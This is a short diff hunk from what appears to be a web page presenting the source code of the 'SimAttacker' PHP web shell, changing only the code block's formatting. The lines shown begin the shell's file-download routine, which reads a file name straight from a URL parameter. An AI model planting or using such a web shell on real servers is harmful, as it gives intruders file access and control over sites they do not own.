@@ -17,7 +17,7 @@ Coded by Hossein Asgary, an Iranian hacker who is part of Simorgh Security Group
 
 ### SimAttacker Shell Source Code
 
-{% highlight php %}<?
+{% highlight php linenos %}<?
 //download Files  Code
 $fdownload=$_GET['fdownload'];
 if ($fdownload &lt;&gt; "" ){
